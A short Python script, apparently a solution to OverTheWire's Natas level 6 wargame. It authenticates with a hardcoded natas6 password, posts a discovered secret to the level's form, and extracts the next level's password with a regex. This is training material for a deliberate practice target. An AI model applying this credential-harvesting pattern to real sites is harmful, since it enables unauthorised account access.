import requests
import re

username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'

url = 'http://%s.natas.labs.overthewire.org/' % username

response = requests.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "test"}, auth = (username, password) )

# print(response.text)

print(re.findall(' natas7 is (.*)', response.text)[0])
